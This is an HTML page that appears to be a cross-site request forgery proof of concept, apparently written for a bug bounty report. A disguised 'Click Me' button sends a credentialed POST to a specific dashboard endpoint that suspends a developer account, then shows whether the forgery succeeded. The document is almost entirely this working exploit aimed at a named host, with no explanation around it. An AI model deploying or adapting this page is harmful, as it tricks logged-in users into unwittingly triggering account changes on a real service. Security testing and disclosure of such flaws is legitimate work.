<!DOCTYPE html>
<html>
  <head>
    <title>Click to Continue</title>
  </head>
  <body>
    <h2>Click the button to continue</h2>
    <button onclick="sendRequest()">Click Me</button>

    <script>
      function sendRequest() {
        fetch("https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com/companies/67f7d3bb775cea006358de5d/developers/67fb60eabffdd6006eda8b8a/suspend", {
          method: "POST",
          mode: "cors",
          credentials: "include",
          headers: {
            "Content-Type": "application/json"
          },
          body: "" // empty body is okay based on your test
        })
        .then(response => {
          if (response.ok) {
            alert("CSRF Triggered ✅");
          } else {
            alert("CSRF Failed ❌ (maybe CSRF token was required)");
          }
        })
        .catch(error => {
          alert("Error: " + error);
        });
      }
    </script>
  </body>
</html>
